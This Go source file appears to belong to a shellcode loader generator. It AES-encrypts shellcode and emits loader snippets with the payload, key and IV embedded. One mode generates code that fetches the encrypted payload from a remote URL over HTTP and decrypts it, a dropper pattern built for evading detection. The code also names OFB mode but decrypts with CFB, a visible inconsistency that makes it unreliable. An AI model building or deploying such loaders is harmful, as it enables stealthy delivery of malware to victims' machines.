package encode

var (
	OfbDecrypt = []string{
		`func f(ciphertext []byte, randomKey, ivStr string) ([]byte){
							keyBytes, err := hex.DecodeString(randomKey)  
							if err != nil {  
								return nil
							}  
							block, err := aes.NewCipher(keyBytes)  
							if err != nil {  
								return nil 
							}  
							iv, err := hex.DecodeString(ivStr)  
							if err != nil {  
								return nil 
							}  
							if len(iv) != aes.BlockSize {  
								return nil
							}  
							stream := cipher.NewCFBDecrypter(block, iv)  
							plaintext := make([]byte, len(ciphertext))
							stream.XORKeyStream(plaintext, ciphertext)
							return plaintext
							}`,
		`
		"crypto/aes"
 		"crypto/cipher"
  		"encoding/hex"
		`,
		`
		"crypto/aes"
		"io/ioutil"
 		"crypto/cipher"
  		"encoding/hex"
		`,
		`
		"net/http"
		"io/ioutil"
		"crypto/aes"
 		"crypto/cipher"
  		"encoding/hex"
		`,
	}
)

func OfbGenerate(byteData []byte, sepMode, sepSrc string) string {
	randomKey, _ := GenerateRandomString(32)
	encryptShellcode, IV := AesEncryptByOFB(byteData, randomKey) //进行加密处理
	hexString := byteSliceToHexString(encryptShellcode)
	switch sepMode {
	case "default":
		byteString := "byteSlice :=" + hexString + "\n\t" + "byteSlice = f(byteSlice,\"" + randomKey + "\",\"" + IV + "\")\n\t"
		return byteString
	case "Local Separate":
		// 创建一个文件来写入加密的数据
		CreateSeprarteLocalFile(encryptShellcode, sepSrc)
		byteString := "byteSlice, _ := ioutil.ReadFile(\"" + sepSrc + "\")" + "\n\t" + "byteSlice = f(byteSlice,\"" + randomKey + "\",\"" + IV + "\")\n\t"
		return byteString
	case "Remote Separate":
		// 创建一个文件来写入加密的数据 存储到本地,使用时需要重命名
		CreateSeprarteLocalFile(encryptShellcode, "sc.ini")
		byteString := `res, _ := http.Get("` + sepSrc + `")
					byteSlice, _ := ioutil.ReadAll(res.Body) 
					byteSlice = f(byteSlice,` + "\"" + randomKey + "\",\"" + IV + "\"" + `)`
		return byteString
	}
	return "Error"
}
